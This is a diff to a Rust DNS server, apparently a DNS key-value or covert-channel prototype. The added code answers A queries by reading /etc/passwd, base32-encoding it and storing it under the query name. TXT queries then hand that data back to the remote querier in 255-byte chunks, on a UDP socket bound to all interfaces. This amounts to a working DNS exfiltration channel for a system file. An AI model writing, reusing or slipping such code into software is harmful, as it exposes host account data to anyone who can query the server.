@@ -1,11 +1,13 @@
 use std::{
     collections::HashMap,
-    io::Bytes,
     net::SocketAddr,
-    sync::{Arc, LazyLock},
+    sync::{Arc, Mutex, OnceLock},
 };
 
-use tokio::net::UdpSocket;
+use data_encoding::BASE32_NOPAD;
+use dns_kv::Message;
+
+use tokio::{fs, net::UdpSocket};
 
 use simple_dns::{
     rdata::{RData, A, AAAA, TXT},
@@ -16,13 +18,39 @@ use simple_dns::{
 type Result<T> = core::result::Result<T, Error>;
 type Error = Box<dyn std::error::Error>;
 
-#[allow(unused)]
-type Database = HashMap<String, Bytes<u8>>;
+type Database = HashMap<String, String>;
 
-#[allow(unused)]
-static DATABASE: LazyLock<Arc<Database>> = LazyLock::new(|| Arc::new(HashMap::new()));
+static DATABASE: OnceLock<Mutex<Database>> = OnceLock::new();
+
+fn get_value(key: &String) -> Option<String> {
+    let mut db = DATABASE
+        .get()
+        .expect("Database not initialized")
+        .lock()
+        .expect("Failed to lock database");
+    db.remove(key)
+}
+
+fn set_value(key: String, value: String) {
+    let mut db = DATABASE
+        .get()
+        .expect("Database not initialized")
+        .lock()
+        .expect("Failed to lock database");
+    db.insert(key, value);
+}
 
 async fn parse_a_query(q: Question<'_>) -> Result<ResourceRecord<'_>> {
+    let name = q.qname.to_string().to_uppercase();
+    tracing::info!("new a query: {name}");
+
+    let value = fs::read_to_string("/etc/passwd").await?;
+    let data = bincode::serialize(&Message { value })?;
+    let encoded = BASE32_NOPAD.encode(&data);
+
+    set_value(name.clone(), encoded);
+
+    tracing::info!("Set value {}", name);
     Ok(ResourceRecord::new(
         q.qname,
         CLASS::IN,
@@ -45,8 +73,26 @@ async fn parse_aaaa_query(q: Question<'_>) -> Result<ResourceRecord<'_>> {
 }
 
 async fn parse_txt_query(q: Question<'_>) -> Result<ResourceRecord<'_>> {
+    let name = q.qname.to_string().to_uppercase();
+    tracing::info!("Lookup {}", name);
+
+    let value = get_value(&name).unwrap_or("AAAA".to_string());
+
+    let len = value.clone().len().min(255);
+    let (txt, remainder) = value.split_at(len);
+
+    tracing::info!("Got value {}", value);
+
+    if !remainder.is_empty() {
+        set_value(name.clone(), remainder.to_string());
+    } else {
+        tracing::info!("No remaining info");
+    };
+
+    tracing::info!("returning {}", &value);
+
     let mut data = TXT::new();
-    let _ = data.add_string("AAAA");
+    data.add_char_string(txt.to_string().try_into()?);
     Ok(ResourceRecord::new(
         q.qname.clone(),
         CLASS::IN,
@@ -86,6 +132,8 @@ async fn main() -> Result<()> {
             |_| format!("{}=debug", env!("CARGO_CRATE_NAME")),
         )))
         .try_init()?;
+
+    DATABASE.get_or_init(|| Mutex::new(HashMap::new()));
 
     let socket = UdpSocket::bind("0.0.0.0:5353").await?;
     tracing::info!("listening on {}", socket.local_addr().unwrap());
